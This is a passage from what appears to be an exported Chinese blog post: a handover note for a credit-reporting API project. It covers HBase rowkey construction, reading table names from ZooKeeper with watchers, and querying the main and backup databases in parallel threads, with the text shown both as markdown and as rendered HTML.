{\n  byte[] value = result.getValue(FAMILYNAME, QUALIFIER);\n}\n```\n\n### 2.整体流程\n\n![zhengxinapi](http://67.216.218.49:8000/file/blogs/others/zhengxinapi_02.png)\n\n由上面可知，要获取数据，需先得到表名和rowkey,其实还需要column值，但是column固定为(f簇,q列),所以不需要再获取.\n\n\n### 3.rowkey构造\n\nrowkey的构建规则与数据入库的规则有关。<br>\n征信项目现有三种类型的HBase库(主备库，信令库，交际圈库),具体在交接文档(征信接口列表—迁移后 20181212.xls)中有注明.\n\n- 主备库\n\n例子:https://code.bonc.com.cn/zhengXinApi/credit (三要素验证,四档)\n\n```\nbyte[] rowkeyHash = Bytes.toBytes((short)(\"电话号码MD5\".hashCode() & 0x7FFF));\nbyte[] key = Bytes.add(rowkeyHash, Bytes.toBytes(\"电话号码MD5\"));\nGet get = new Get(key);\n```\n\n- 信令库\n\n例子:https://code.bonc.com.cn/zhengXinApi/query  (实时位置查询)\n```\nbyte[] phone_id = Bytes.copy(Bytes.toBytes(Long.parseLong(TelNo)), 3, 5);\nbyte[] phone_id_hash = Bytes.toBytes((short) (TelNo.hashCode() & 0x7fff));\nbyte[] key = Bytes.add(phone_id_hash, phone_id);\nGet get = new Get(key);\n```\n\n- 交际圈库\n\n例子:https://code.bonc.com.cn/zhengXinApi/amc_istopcontact (是否联系人手机号验证，电信合作版)\n\n```\nbyte[] deice_number_hash = Bytes.toBytes((short)(device_Number.hashCode() & 0x7FFF));\nbyte[] deice_number = Bytes.toBytes(device_Number);\nbyte[] oppose_number = Bytes.toBytes(oppose_Number);\nbyte[] key = Bytes.add(deice_number_hash, deice_number, oppose_number);\nScan s = new Scan();\ns.setStartRow(Bytes.add(key, Bytes.toBytes(0)));\ns.setStopRow(Bytes.add(key, Bytes.toBytes(999999999)));\n```\n\n这里是用的Scan<br>\n按指定rowkey获取唯一一条记录：get方法。<br>\n按指定条件获取一批记录：scan方法。\n\n### 4.tableName获取\n\n在这里先简单介绍下zookeeper.<br>\n具体的我没仔细看，这里是一篇详细介绍的文章: https://blog.csdn.net/guchuanyun111/article/details/52091318\n\n\n#### 4.1 Zookeeper简要了解\n\nZooKeeper主要是为分布式系统提供一致性协调(Coordination)服务。简单讲就是，如果某个节点宕机后，Zookeeper会通过选举算法重新选出一个节点，保证它不会由于单一节点的故障而造成问题.<br>\n\nZookeeper中存储的数据为树形结构，其上的每一个节点称为znode<br>\n![znode](http://67.216.218.49:8000/file/blogs/others/zhengxinapi_znode_01.jpg)\n\n如征信用户验证表名节点路径为\n```\n <property name=\"zkTableNamePath\" value=\"/fengkong/table/user_check\" />\n```\n\nZooKeeper中的Watch机制(观察者模式)：Client可以在某个ZNode上设置一个Watcher，来Watch该ZNode上的变化。如果该ZNode上有相应的变化，就会触发这个Watcher，把相应的事件通知给设置Watcher的Client。需要注意的是，ZooKeeper中的Watcher是一次性的，即触发一次就会被取消，如果想继续Watch的话，需要客户端重新设置Watcher。\n\n#### 4.2 征信接口中的Zookeeper使用\n\n##### 4.2.1 为什么要用zookeeper\n\n以前征信接口项目中的表名都是放在redis还是oracle中的。表名会定期更新<br>\n后来出现了机房网络割接，导致某个数据库不可用，导致接口不可用，所以将之切换到了zookeeper中，某个节点挂掉不会影响使用.\n\n##### 4.2.2 怎么用\n\n\n连接zk时，注册该节点为监控状态<br>\npublic ZooKeeper(String connectString, int sessionTimeout, Watcher watcher) throws IOException{}\n```\npublic ZooKeeperConnection(String connectString, int sessionTimeOut, InitUtil initUtil) {\n       this.connectString = connectString;\n       this.sessionTimeOut = sessionTimeOut;\n       this.initUtil = initUtil;\n       try {\n           //zk的连接是异步的，建立连接后会调用process方法。\n           zooKeeper = new ZooKeeper(\"xx.xx.xx.xx:2181,xx.xx.xx.xx:2181,xx.xx.xx.xx8:2181\", sessionTimeOut, this);\n       } catch (IOException e) {\n           e.printStackTrace();\n           logger.error(\"zk创建失败,\" + e.toString());\n       } catch (NullPointerException e) {\n           e.printStackTrace();\n           //logger.error(\"zk创建失败,connectString: \" + prop.getConnectString() + \",sessionTimeOut: \" + prop.getSessionTimeOut() + \",\" + e.toString());\n       }\n\n   }\n```\n\n从zk节点中获取表名,获取到数据时，重新注册为被监控状态.<br>\npublic byte[] getData(String path, boolean watch, Stat stat) throws KeeperException, InterruptedException { }\n\n```\n@Override\npublic void process(WatchedEvent event) {\n   try {\n       //连接事件\n       if (event.getType() == Event.EventType.None) {\n           logger.info(\"连接事件\");\n           //连接成功\n           if (event.getState() == Event.KeeperState.SyncConnected) {\n               logger.info(\"建立连接\");\n               String tableName = new String(zooKeeper.getData(initUtil.getZkTableNamePath(),true,null));\n               initUtil.setTableName(tableName);\n\n           } else if (event.getState() == Event.KeeperState.Expired || event.getState() == Event.KeeperState.Disconnected) {\n               logger.info(event.getState() == Event.KeeperState.Expired ? \"客户端超时\" : \"客户端断开连接\");\n               try {\n                   if (zooKeeper != null) {\n                       try {\n                           zooKeeper.close();\n                           zooKeeper = null;\n                       } catch (Exception e) {\n                           e.printStackTrace();\n                           logger.error(\"zk状态:\" + zooKeeper.getState() + \",\" + e.toString());\n                       }\n                   }\n                   zooKeeper = new ZooKeeper(connectString, sessionTimeOut, this);\n               } catch (IOException e) {\n                   e.printStackTrace();\n                   logger.error(\"zk创建失败,\" + e.toString());\n               }\n           }\n       } else if (event.getType() == Event.EventType.NodeDataChanged) {\n           //todo 这里是单个路径发生变化，上面是启动时/重连时 对所有路径进行监听\n           logger.info(\"节点值变化事件\");\n           String tableName = new String(zooKeeper.getData(initUtil.getZkTableNamePath(),true,null));\n           initUtil.setTableName(tableName);\n       }\n   } catch (KeeperException | InterruptedException e) {\n       e.printStackTrace();\n   }\n}\n```\n\n### 5.数据获取\n\n在tableName 和 rowkey 已知后，就可以直接获取数据了。但是在主备库情况下，主库备库都需要查询，又因为确定了只有两个库，所以在这里直接new了两个线程，不用使用线程池。\n```\npublic List<String> threadQuery(Get get,String tableName,String logInfo){\n\tList<HbaseQueryUserThread> threadList = new ArrayList<>();\n\tList<String> resultList = null;\n\tfor (String zkroot : HBasePool.getZKROOT()) {\n\t\ttry {\n\t\t\tHbaseQueryUserThread thread = new HbaseQueryUserThread(get, HBasePool.getHConnection(zkroot), tableName, logInfo);\n\t\t\tthread.setName(\"/hbase_zx\".equals(zkroot) ? \"主库\" : \"备库\");\n\t\t\tthreadList.add(thread);\n\t\t\tthread.start();\n\t\t} catch (IOException e) {\n\t\t\tSystem.out.println(\"hbase创建出错===================================\");\n\t\t\te.printStackTrace();\n\t\t}\n\t}\n\n\t//完成计数\n\tint finish = 0;\n\n\tw:while (finish != threadList.size()) {\n\t\t//重置完成计数\n\t\tfinish = 0;\n\t\ttry {\n\t\t\tThread.sleep(1);\n\t\t} catch (InterruptedException e) {\n\t\t\te.printStackTrace();\n\t\t}\n\t\tfor (HbaseQueryUserThread t : threadList) {\n\t\t\t//System.out.println(t.getName() + \"线程状态：\" + t.getState());\n\t\t\t//线程存活\n\t\t\tif (!t.isAlive()) {\n\t\t\t\t//结束 标识增加\n\t\t\t\tfinish++;\n\t\t\t\t//赋值\n\t\t\t\tresultList = t.getList();\n\t\t\t\t//有结果\n\t\t\t\tif (t.getList().size() > 0){\n\t\t\t\t\t//System.out.println(\"跳出for\");\n\t\t\t\t\t//中断其他线程\n\t\t\t\t\tfor (HbaseQueryUserThread thread : threadList){\n\t\t\t\t\t\tthread.interrupt();\n\t\t\t\t\t}\n\t\t\t\t\t//跳出while循环\n\t\t\t\t\tbreak w;\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t}\n\treturn resultList;\n}\n```\n","slug":"风控项目交接说明一","published":1,"updated":"2019-10-13T12:15:12.184Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ck23321gp000d6dcp57uqg977","content":"<h2 id=\"一-整体介绍\"><a href=\"#一-整体介绍\" class=\"headerlink\" title=\"一.整体介绍\"></a>一.整体介绍</h2><p>征信项目现有140多个接口.<br></p>\n<p>每个接口都是一个单独的项目，有 webservice 和 springboot 两种类型，但是除了接口请求方式外，里面<br>具体处理逻辑基本一致。<br></p>\n<p>项目地址: <a href=\"https://code.bonc.com.cn/groups/zhengXinApi\" target=\"_blank\" rel=\"noopener\">https://code.bonc.com.cn/groups/zhengXinApi</a></p>\n<p><img src=\"http://67.216.218.49:8000/file/blogs/others/zhengxinapi_01.png\" alt=\"zhengxinapi\"></p>\n<h2 id=\"二-具体情况\"><a href=\"#二-具体情况\" class=\"headerlink\" title=\"二.具体情况\"></a>二.具体情况</h2><p>因为所有接口基本一个流程，所以举一个例子来进行介绍(三要素验证，4档，用户状态验证).<br></p>\n<p>讲具体逻辑之前，先看看HBase数据存储格式.</p>\n<h3 id=\"1-Hbase\"><a href=\"#1-Hbase\" class=\"headerlink\" title=\"1.Hbase\"></a>1.Hbase</h3><p>HBase 是一个NoSQL数据库，用于处理海量数据，可以支持10亿行百万列的大表.<br></p>\n<p>底层依赖于 HDFS(Hadoop Distributed File System) 作为存储空间.</p>\n<h4 id=\"1-1-数据存储格式\"><a href=\"#1-1-数据存储格式\" class=\"headerlink\" title=\"1.1 数据存储格式\"></a>1.1 数据存储格式</h4><p>如图这是HBase中的某张表的格式。</p>\n<p><img src=\"http://67.216.218.49:8000/file/blogs/database/hbase/hbase_database_01.png\" alt=\"Hbase1\"></p>\n<p> 字段意思 : <br></p>\n<ul>\n<li>rowkey</li>\n</ul>\n<p>行键，用来确定具体的某一行。</p>\n<ul>\n<li>family</li>\n</ul>\n<p>列簇，列簇将表切割成不同部分。字节数组。</p>\n<ul>\n<li>qualifier</li>\n</ul>\n<p>列，列属于列簇，列的数量没有限制，可以动态添加.字节数组。</p>\n<ul>\n<li>cell</li>\n</ul>\n<p>存储具体数据的单元 . 没有数据类型，字节数组的形式存储.<br><br>在HBase每个cell存储单元对同一份数据有多个版本，根据唯一的时间戳来<br>区分每个版本之间的差异，时间戳可以由HBase(在数据写入时自动)赋值，<br>此时时间戳是精确到毫秒的当前系统时间，也可以由自己显示指定，按照时<br>间戳倒序排序，最新的数据排在最前面。</p>\n<h4 id=\"1-2-从表中取数据\"><a href=\"#1-2-从表中取数据\" class=\"headerlink\" title=\"1.2 从表中取数据\"></a>1.2 从表中取数据</h4><p>由{rowkey，column(family + qualifier)，version}唯一确定的单元.<br><br>注意，列中包含了列簇和列簇下面具体的列.<br></p>\n<p>所以取数据一般流程为:<br><br>得到表名 –&gt; 得到rowkey –&gt; 根据column取得cell –&gt; 取出数据.</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//table</span><br><span class=\"line\">Table table = connection.getTable(TableName.valueOf(tableName));</span><br><span class=\"line\"></span><br><span class=\"line\">//rowkey</span><br><span class=\"line\">byte[] rowkeyHash = Bytes.toBytes((short)(mobnol.hashCode() &amp; 0x7FFF));</span><br><span class=\"line\">byte[] key = Bytes.add(rowkeyHash, Bytes.toBytes(mobnol));</span><br><span class=\"line\">Get get = new Get(key);</span><br><span class=\"line\"></span><br><span class=\"line\">//value</span><br><span class=\"line\">Result result = table.get(get);</span><br><span class=\"line\">if (!result.isEmpty()) &#123;</span><br><span class=\"line\">  byte[] value = result.getValue(FAMILYNAME, QUALIFIER);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"2-整体流程\"><a href=\"#2-整体流程\" class=\"headerlink\" title=\"2.整体流程\"></a>2.整体流程</h3><p><img src=\"http://67.216.218.49:8000/file/blogs/others/zhengxinapi_02.png\" alt=\"zhengxinapi\"></p>\n<p>由上面可知，要获取数据，需先得到表名和rowkey,其实还需要column值，但是column固定为(f簇,q列),所以不需要再获取.</p>\n<h3 id=\"3-rowkey构造\"><a href=\"#3-rowkey构造\" class=\"headerlink\" title=\"3.rowkey构造\"></a>3.rowkey构造</h3><p>rowkey的构建规则与数据入库的规则有关。<br><br>征信项目现有三种类型的HBase库(主备库，信令库，交际圈库),具体在交接文档(征信接口列表—迁移后 20181212.xls)中有注明.</p>\n<ul>\n<li>主备库</li>\n</ul>\n<p>例子:<a href=\"https://code.bonc.com.cn/zhengXinApi/credit\" target=\"_blank\" rel=\"noopener\">https://code.bonc.com.cn/zhengXinApi/credit</a> (三要素验证,四档)</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">byte[] rowkeyHash = Bytes.toBytes((short)(&quot;电话号码MD5&quot;.hashCode() &amp; 0x7FFF));</span><br><span class=\"line\">byte[] key = Bytes.add(rowkeyHash, Bytes.toBytes(&quot;电话号码MD5&quot;));</span><br><span class=\"line\">Get get = new Get(key);</span><br></pre></td></tr></table></figure>\n<ul>\n<li>信令库</li>\n</ul>\n<p>例子:<a href=\"https://code.bonc.com.cn/zhengXinApi/query\" target=\"_blank\" rel=\"noopener\">https://code.bonc.com.cn/zhengXinApi/query</a>  (实时位置查询)<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">byte[] phone_id = Bytes.copy(Bytes.toBytes(Long.parseLong(TelNo)), 3, 5);</span><br><span class=\"line\">byte[] phone_id_hash = Bytes.toBytes((short) (TelNo.hashCode() &amp; 0x7fff));</span><br><span class=\"line\">byte[] key = Bytes.add(phone_id_hash, phone_id);</span><br><span class=\"line\">Get get = new Get(key);</span><br></pre></td></tr></table></figure></p>\n<ul>\n<li>交际圈库</li>\n</ul>\n<p>例子:<a href=\"https://code.bonc.com.cn/zhengXinApi/amc_istopcontact\" target=\"_blank\" rel=\"noopener\">https://code.bonc.com.cn/zhengXinApi/amc_istopcontact</a> (是否联系人手机号验证，电信合作版)</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">byte[] deice_number_hash = Bytes.toBytes((short)(device_Number.hashCode() &amp; 0x7FFF));</span><br><span class=\"line\">byte[] deice_number = Bytes.toBytes(device_Number);</span><br><span class=\"line\">byte[] oppose_number = Bytes.toBytes(oppose_Number);</span><br><span class=\"line\">byte[] key = Bytes.add(deice_number_hash, deice_number, oppose_number);</span><br><span class=\"line\">Scan s = new Scan();</span><br><span class=\"line\">s.setStartRow(Bytes.add(key, Bytes.toBytes(0)));</span><br><span class=\"line\">s.setStopRow(Bytes.add(key, Bytes.toBytes(999999999)));</span><br></pre></td></tr></table></figure>\n<p>这里是用的Scan<br><br>按指定rowkey获取唯一一条记录：get方法。<br><br>按指定条件获取一批记录：scan方法。</p>\n<h3 id=\"4-tableName获取\"><a href=\"#4-tableName获取\" class=\"headerlink\" title=\"4.tableName获取\"></a>4.tableName获取</h3><p>在这里先简单介绍下zookeeper.<br><br>具体的我没仔细看，这里是一篇详细介绍的文章: <a href=\"https://blog.csdn.net/guchuanyun111/article/details/52091318\" target=\"_blank\" rel=\"noopener\">https://blog.csdn.net/guchuanyun111/article/details/52091318</a></p>\n<h4 id=\"4-1-Zookeeper简要了解\"><a href=\"#4-1-Zookeeper简要了解\" class=\"headerlink\" title=\"4.1 Zookeeper简要了解\"></a>4.1 Zookeeper简要了解</h4><p>ZooKeeper主要是为分布式系统提供一致性协调(Coordination)服务。简单讲就是，如果某个节点宕机后，Zookeeper会通过选举算法重新选出一个节点，保证它不会由于单一节点的故障而造成问题.<br></p>\n<p>Zookeeper中存储的数据为树形结构，其上的每一个节点称为znode<br><br><img src=\"http://67.216.218.49:8000/file/blogs/others/zhengxinapi_znode_01.jpg\" alt=\"znode\"></p>\n<p>如征信用户验证表名节点路径为<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;property name=&quot;zkTableNamePath&quot; value=&quot;/fengkong/table/user_check&quot; /&gt;</span><br></pre></td></tr></table></figure></p>\n<p>ZooKeeper中的Watch机制(观察者模式)：Client可以在某个ZNode上设置一个Watcher，来Watch该ZNode上的变化。如果该ZNode上有相应的变化，就会触发这个Watcher，把相应的事件通知给设置Watcher的Client。需要注意的是，ZooKeeper中的Watcher是一次性的，即触发一次就会被取消，如果想继续Watch的话，需要客户端重新设置Watcher。</p>\n<h4 id=\"4-2-征信接口中的Zookeeper使用\"><a href=\"#4-2-征信接口中的Zookeeper使用\" class=\"headerlink\" title=\"4.2 征信接口中的Zookeeper使用\"></a>4.2 征信接口中的Zookeeper使用</h4><h5 id=\"4-2-1-为什么要用zookeeper\"><a href=\"#4-2-1-为什么要用zookeeper\" class=\"headerlink\" title=\"4.2.1 为什么要用zookeeper\"></a>4.2.1 为什么要用zookeeper</h5><p>以前征信接口项目中的表名都是放在redis还是oracle中的。表名会定期更新<br><br>后来出现了机房网络割接，导致某个数据库不可用，导致接口不可用，所以将之切换到了zookeeper中，某个节点挂掉不会影响使用.</p>\n<h5 id=\"4-2-2-怎么用\"><a href=\"#4-2-2-怎么用\" class=\"headerlink\" title=\"4.2.2 怎么用\"></a>4.2.2 怎么用</h5><p>连接zk时，注册该节点为监控状态<br><br>public ZooKeeper(String connectString, int sessionTimeout, Watcher watcher) throws IOException{}<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public ZooKeeperConnection(String connectString, int sessionTimeOut, InitUtil initUtil) &#123;</span><br><span class=\"line\">       this.connectString = connectString;</span><br><span class=\"line\">       this.sessionTimeOut = sessionTimeOut;</span><br><span class=\"line\">       this.initUtil = initUtil;</span><br><span class=\"line\">       try &#123;</span><br><span class=\"line\">           //zk的连接是异步的，建立连接后会调用process方法。</span><br><span class=\"line\">           zooKeeper = new ZooKeeper(&quot;xx.xx.xx.xx:2181,xx.xx.xx.xx:2181,xx.xx.xx.xx8:2181&quot;, sessionTimeOut, this);</span><br><span class=\"line\">       &#125; catch (IOException e) &#123;</span><br><span class=\"line\">           e.printStackTrace();</span><br><span class=\"line\">           logger.error(&quot;zk创建失败,&quot; + e.toString());</span><br><span class=\"line\">       &#125; catch (NullPointerException e) &#123;</span><br><span class=\"line\">           e.printStackTrace();</span><br><span class=\"line\">           //logger.error(&quot;zk创建失败,connectString: &quot; + prop.getConnectString() + &quot;,sessionTimeOut: &quot; + prop.getSessionTimeOut() + &quot;,&quot; + e.toString());</span><br><span class=\"line\">       &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">   &#125;</span><br></pre></td></tr></table></figure></p>\n<p>从zk节点中获取表名,获取到数据时，重新注册为被监控状态.<br><br>public byte[] getData(String path, boolean watch, Stat stat) throws KeeperException, InterruptedException { }</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">@Override</span><br><span class=\"line\">public void process(WatchedEvent event) &#123;</span><br><span class=\"line\">   try &#123;</span><br><span class=\"line\">       //连接事件</span><br><span class=\"line\">       if (event.getType() == Event.EventType.None) &#123;</span><br><span class=\"line\">           logger.info(&quot;连接事件&quot;);</span><br><span class=\"line\">           //连接成功</span><br><span class=\"line\">           if (event.getState() == Event.KeeperState.SyncConnected) &#123;</span><br><span class=\"line\">               logger.info(&quot;建立连接&quot;);</span><br><span class=\"line\">               String tableName = new String(zooKeeper.getData(initUtil.getZkTableNamePath(),true,null));</span><br><span class=\"line\">               initUtil.setTableName(tableName);</span><br><span class=\"line\"></span><br><span class=\"line\">           &#125; else if (event.getState() == Event.KeeperState.Expired || event.getState() == Event.KeeperState.Disconnected) &#123;</span><br><span class=\"line\">               logger.info(event.getState() == Event.KeeperState.Expired ? &quot;客户端超时&quot; : &quot;客户端断开连接&quot;);</span><br><span class=\"line\">               try &#123;</span><br><span class=\"line\">                   if (zooKeeper != null) &#123;</span><br><span class=\"line\">                       try &#123;</span><br><span class=\"line\">                           zooKeeper.close();</span><br><span class=\"line\">                           zooKeeper = null;</span><br><span class=\"line\">                       &#125; catch (Exception e) &#123;</span><br><span class=\"line\">                           e.printStackTrace();</span><br><span class=\"line\">                           logger.error(&quot;zk状态:&quot; + zooKeeper.getState() + &quot;,&quot; + e.toString());</span><br><span class=\"line\">                       &#125;</span><br><span class=\"line\">                   &#125;</span><br><span class=\"line\">                   zooKeeper = new ZooKeeper(connectString, sessionTimeOut, this);</span><br><span class=\"line\">               &#125; catch (IOException e) &#123;</span><br><span class=\"line\">                   e.printStackTrace();</span><br><span class=\"line\">                   logger.error(&quot;zk创建失败,&quot; + e.toString());</span><br><span class=\"line\">               &#125;</span><br><span class=\"line\">           &#125;</span><br><span class=\"line\">       &#125; else if (event.getType() == Event.EventType.NodeDataChanged) &#123;</span><br><span class=\"line\">           //todo 这里是单个路径发生变化，上面是启动时/重连时 对所有路径进行监听</span><br><span class=\"line\">           logger.info(&quot;节点值变化事件&quot;);</span><br><span class=\"line\">           String tableName = new String(zooKeeper.getData(initUtil.getZkTableNamePath(),true,null));</span><br><span class=\"line\">           initUtil.setTableName(tableName);</span><br><span class=\"line\">       &#125;</span><br><span class=\"line\">   &#125; catch (KeeperException | InterruptedException e) &#123;</span><br><span class=\"line\">       e.printStackTrace();</span><br><span class=\"line\">   &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"5-数据获取\"><a href=\"#5-数据获取\" class=\"headerlink\" title=\"5.数据获取\"></a>5.数据获取</h3><p>在tableName 和 rowkey 已知后，就可以直接获取数据了。但是在主备库情况下，主库备库都需要查询，又因为确定了只有两个库，所以在这里直接new了两个线程，不用使用线程池。<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public List&lt;String&gt; threadQuery(Get get,String tableName,String logInfo)&#123;</span><br><span class=\"line\">\tList&lt;HbaseQueryUserThread&gt; threadList = new ArrayList&lt;&gt;();</span><br><span class=\"line\">\tList&lt;String&gt; resultList = null;</span><br><span class=\"line\">\tfor (String zkroot : HBasePool.getZKROOT()) &#123;</span><br><span class=\"line\">\t\ttry &#123;</span><br><span class=\"line\">\t\t\tHbaseQueryUserThread thread = new HbaseQueryUserThread(get, HBasePool.getHConnection(zkroot), tableName, logInfo);</span><br><span class=\"line\">\t\t\tthread.setName(&quot;/hbase_zx&quot;.equals(zkroot) ? &quot;主库&quot; : &quot;备库&quot;);</span><br><span class=\"line\">\t\t\tthreadList.add(thread);</span><br><span class=\"line\">\t\t\tthread.start();</span><br><span class=\"line\">\t\t&#125; catch (IOException e) &#123;</span><br><span class=\"line\">\t\t\tSystem.out.println(&quot;hbase创建出错===================================&quot;);</span><br><span class=\"line\">\t\t\te.printStackTrace();</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t//完成计数</span><br><span class=\"line\">\tint finish = 0;</span><br><span class=\"line\"></span><br><span class=\"line\">\tw:while (finish != threadList.size()) &#123;</span><br><span class=\"line\">\t\t//重置完成计数</span><br><span class=\"line\">\t\tfinish = 0;</span><br><span class=\"line\">\t\ttry &#123;</span><br><span class=\"line\">\t\t\tThread.sleep(1);</span><br><span class=\"line\">\t\t&#125; catch (InterruptedException e) &#123;</span><br><span class=\"line\">\t\t\te.printStackTrace();</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\tfor (HbaseQueryUserThread t : threadList) &#123;</span><br><span class=\"line\">\t\t\t//System.out.println(t.getName() + &quot;线程状态：&quot; + t.getState());</span><br><span class=\"line\">\t\t\t//线程存活</span><br><span class=\"line\">\t\t\tif (!t.isAlive()) &#123;</span><br><span class=\"line\">\t\t\t\t//结束 标识增加</span><br><span class=\"line\">\t\t\t\tfinish++;</span><br><span class=\"line\">\t\t\t\t//赋值</span><br><span class=\"line\">\t\t\t\tresultList = t.getList();</span><br><span class=\"line\">\t\t\t\t//有结果</span><br><span class=\"line\">\t\t\t\tif (t.getList().size() &gt; 0)&#123;</span><br><span class=\"line\">\t\t\t\t\t//System.out.println(&quot;跳出for&quot;);</span><br><span class=\"line\">\t\t\t\t\t//中断其他线程</span><br><span class=\"line\">\t\t\t\t\tfor (HbaseQueryUserThread thread : threadList)&#123;</span><br><span class=\"line\">\t\t\t\t\t\tthread.interrupt();</span><br><span class=\"line\">\t\t\t\t\t&#125;</span><br><span class=\"line\">\t\t\t\t\t//跳出while循环</span><br><span class=\"line\">\t\t\t\t\tbreak w;</span><br><span class=\"line\">\t\t\t\t&#125;</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\treturn resultList;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"一-整体介绍\"><a href=\"#一-整体介绍\" class=\"headerlink\" title=\"一.整体介绍\"></a>一.整体介绍</h2><p>征信项目现有140多个接口.<br></p>\n<p>每个接口都是一个单独的项目，有 webservice 和 springboot 两种类型，但是除了接口请求方式外，里面<br>具体处理逻辑基本一致。<br></p>\n<p>项目地址: <a href=\"https://code.bonc.com.cn/groups/zhengXinApi\" target=\"_blank\" rel=\"noopener\">https://code.bonc.com.cn/groups/zhengXinApi</a></p>\n<p><img src=\"http://67.216.218.49:8000/file/blogs/others/zhengxinapi_01.png\" alt=\"zhengxinapi\"></p>\n<h2 id=\"二-具体情况\"><a href=\"#二-具体情况\" class=\"headerlink\" title=\"二.具体情况\"></a>二.具体情况</h2><p>因为所有接口基本一个流程，所以举一个例子来进行介绍(三要素验证，4档，用户状态验证).<br></p>\n<p>讲具体逻辑之前，先看看HBase数据存储格式.</p>\n<h3 id=\"1-Hbase\"><a href=\"#1-Hbase\" class=\"headerlink\" title=\"1.Hbase\"></a>1.Hbase</h3><p>HBase 是一个NoSQL数据库，用于处理海量数据，可以支持10亿行百万列的大表.<br></p>\n<p>底层依赖于 HDFS(Hadoop Distributed File System) 作为存储空间.</p>\n<h4 id=\"1-1-数据存储格式\"><a href=\"#1-1-数据存储格式\" class=\"headerlink\" title=\"1.1 数据存储格式\"></a>1.1 